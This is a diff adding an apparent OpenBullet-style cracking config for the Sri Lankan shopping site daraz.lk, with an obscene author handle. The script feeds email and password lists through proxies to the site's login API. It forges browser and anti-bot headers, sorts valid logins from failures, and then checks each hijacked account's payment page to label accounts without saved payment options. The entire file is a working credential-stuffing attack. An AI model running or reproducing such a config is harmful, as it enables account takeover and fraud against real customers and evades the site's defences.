@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "daraz.lk",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-01T23:28:18.3299881+00:00",
+  "AdditionalInfo": "",
+  "Author": "@YOUR_MOTHER_FUCKER_BITCH",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://member.daraz.lk/user/api/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(_tb_token_)>" LR "" "" -> VAR "TO" 
+
+REQUEST POST "https://member.daraz.lk/user/api/login" 
+  CONTENT "{\"lzdAppVersion\":\"1.0\",\"loginName\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: member.daraz.lk" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-CSRF-TOKEN: <TO>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "x-ua: 140#2MSDNvlrzzFvqzo2ZWr+F6SzQQBgWLHXZ3BODSzOkz+k14Mo8EHTOBKcvzIigadIoYyHAODm1XTDQ97j2HGD9twMeGoki1JLRwgBA2g5dG8mp++x+UJqlbzxkiBeeXILzzr1cOY0ltQzzPzbVXlqlbrDnILoxeXezFFS2XMvl61zzAzx0G7we1zx2P0+qth/oFrL2X8olsMxyI1iiOuN2FcD28dnZpY1ztzV2FM4lv1ozXOiVdnulu1o2ZPKV64PSzri215plpTdzjziV2nqjFrx28nn57rx4zCJ9SvZrI7ZbI8dGblc6/CU8mB1Mv7Rmou6JXBhgYHwfHV6dgZfWyo+VBLt951fGOcUShcBe/b2TZ6G4kNzT6DB7oBVLHBiDVKiuOCiyVKEgQDdNU3dP0MqYaVdPlVDej79z4OVei5cVnuMqRLooL1h6ozerLuoMxaXSinIHXSL06a1Z4TuVpF+R2jWTBf97Jo6SvbHMcxQBKaf5Xm396xmIr3MfMTgZKDlitpuWC8AviB98MgOcPRIFQnwL7eccJXv95+qtarE9UuLCF9yjlAu6aW/pFUh/gdp7ZEoY4U2bzWBY2SMQdZWTxvQsseXLmzgfI+PLfDl6o5uzRpVmoO2ji8/qb/2N3AZF5BjMYxhlBk3P4Q7YTxw/iuRuR/k7yCaJDQylhoOe7mxISXpwWn8KrcNT9ec/Bm8dDxxkkNQCOTKAqi2c0PaQtC2Y4X79WnrfkdghHY+rIP8MC6x3bhoULpxouHxtkcrFOomsiHwZzcq1mr4DjBO/q3ZwFqV17uYuDLwyVtJd9tGirHcG9jAPd883S73osrG0xmAh1TPlOTTl/AI2PY+/WPYyUb/kVf6mikSVr61HFz89yzl3Ud5nsUuISph3CAoI7TWS8bF8Tow7kNacXwMieS1NgCNgod8XmSM3MW3GXqT3DAZM6k93B/9GFMgpjsNmvuO5ioODfNjvUvei6DeoOABvUYX80fRQjroawLX6LdjVvo0Rmzdf6vbjbQM4dkDmM3i0rg5g91WI67TKfLpk1C+oVUWUiEapTlhbOcp+NWWT2JNi2NK3VRalNcyx6c/MrJfn+0Ntus0DWxjDbZA1njhQJQGJ8Yjivhq7lH2RX5N8yqoldMgHUjy0oxPRK44B3ztDCr43tRhCE1jzSJHKplj0s4b1uVSyXXRUmk/MwkmVmLDtrCnad5QeS8Z0Ifl7iggYRf33LYPnHBESwS4El8rksL2Wb7QrXMRoOsN6kos0i5kSuoeih0EIUN8E7zaZZ0UAEBClA+lgjqS9XAgL6ZQvnO9qMRYBxxAcpBofwvk/pnOlenjg9SoRApZlqW1qIjivP+mdB+=" 
+  HEADER "x-umidtoken: T2gAUuY5AHpT5j7VG8zIw-wBVAvmODjGG0HSnog0gftMZT0bso5eT9TepqQ4v0te5IA=" 
+  HEADER "Content-Length: 82" 
+  HEADER "Origin: https://member.daraz.lk" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://member.daraz.lk/user/login?spm=a2a0e.home.header.d5.675a46254XbZHC&redirect=https%3A%2F%2Fwww.daraz.lk%2F" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"success\":false" 
+  KEYCHAIN Success OR 
+    KEY "{\"module\":{\"sessionId\":\"" 
+
+REQUEST GET "https://checkout.daraz.lk/payment/management?spm=a2a0e.my_profile.0.0.5d102f89PCsJOD" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "No payment options" 
+
+FUNCTION Constant "@YOUR_MOTHER_FUCKER_BITCH" -> CAP "CONFIG BY:" 
+
